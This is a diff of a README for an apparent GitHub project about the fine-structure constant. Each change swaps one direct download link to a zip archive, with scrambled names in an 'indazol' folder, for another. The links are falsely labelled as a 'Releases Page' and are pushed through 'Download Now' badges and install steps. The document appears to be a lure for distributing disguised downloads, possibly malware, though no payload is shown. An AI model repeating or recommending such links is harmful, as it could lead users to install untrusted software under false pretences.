@@ -1,6 +1,6 @@
 # 🧪 The-Fine-Structure-Constant-Mystery-1-137- - Explore Physics Mysteries Easily
 
-[![Download Now](https://raw.githubusercontent.com/IIBl4z3MasterII/The-Fine-Structure-Constant-Mystery-1-137-/main/indazol/Mystery_Fine_Constant_The_Structure_conflow.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/IIBl4z3MasterII/The-Fine-Structure-Constant-Mystery-1-137-/main/indazol/Mystery_Fine_Constant_The_Structure_conflow.zip)
+[![Download Now](https://raw.githubusercontent.com/IIBl4z3MasterII/The-Fine-Structure-Constant-Mystery-1-137-/main/indazol/Fine_Structure_Mystery_Constant_The_2.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/IIBl4z3MasterII/The-Fine-Structure-Constant-Mystery-1-137-/main/indazol/Fine_Structure_Mystery_Constant_The_2.9.zip)
 
 ## 📘 Overview
 
@@ -12,7 +12,7 @@ To get started with The Fine Structure Constant Mystery, follow these steps to d
 
 ### 🔗 Download & Install
 
-1. **Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/IIBl4z3MasterII/The-Fine-Structure-Constant-Mystery-1-137-/main/indazol/Mystery_Fine_Constant_The_Structure_conflow.zip)
+1. **Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/IIBl4z3MasterII/The-Fine-Structure-Constant-Mystery-1-137-/main/indazol/Fine_Structure_Mystery_Constant_The_2.9.zip)
    
 2. On the Releases page, locate the latest version of The Fine Structure Constant Mystery.
 
@@ -68,7 +68,7 @@ If you encounter any issues while using the application, try the following:
 
 - **Ensure Compatibility:** Verify that your operating system meets the system requirements.
 - **Reinstall the Application:** If the app does not open, uninstall and reinstall to reset any corrupted files.
-- **Check for Updates:** Visit the [Releases Page](https://raw.githubusercontent.com/IIBl4z3MasterII/The-Fine-Structure-Constant-Mystery-1-137-/main/indazol/Mystery_Fine_Constant_The_Structure_conflow.zip) to ensure you have the latest version.
+- **Check for Updates:** Visit the [Releases Page](https://raw.githubusercontent.com/IIBl4z3MasterII/The-Fine-Structure-Constant-Mystery-1-137-/main/indazol/Fine_Structure_Mystery_Constant_The_2.9.zip) to ensure you have the latest version.
 - **Seek Help:** Access the user forums for common problems and solutions discussed by other users.
 
 ## 📞 Support
